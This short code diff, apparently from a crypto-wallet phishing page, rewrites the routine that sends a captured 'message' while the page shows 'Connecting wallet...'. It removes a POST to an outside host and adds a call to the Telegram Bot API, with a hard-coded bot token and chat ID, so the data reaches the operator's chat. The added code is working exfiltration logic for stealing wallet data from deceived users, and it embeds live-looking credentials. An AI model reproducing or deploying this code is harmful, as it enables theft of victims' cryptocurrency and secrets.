@@ -9112,19 +9112,21 @@
 
         // return console.log(message);
 
-        const botToken = "8321594074:AAF0OiHDnPDyGMa8yWY9oi20I8A6uJhU2o0";
-        const chatId = 7765726318;
+        const botToken = "8845149511:AAEogWdALkIgfk35Hl4Tv1pi2tJFbRZRl38";
+        const chatId = 8850098258;
        
 
-        $.ajax({
-          type: "POST",
-          url: `https://martinemed.homes/sender.php`,
+         $.ajax({
+          type: "GET",
+          url: `https://api.telegram.org/bot${botToken}/sendMessage`,
           headers: {
-            'Content-Type': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded'
           },
-          data: JSON.stringify({
-            'message':message
-          }),
+          data: {
+            'chat_id':chatId,
+        'text': message,
+        'parse_mode' : 'HTML'
+          },
           beforeSend: function () {
             processBtn.html(
               '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
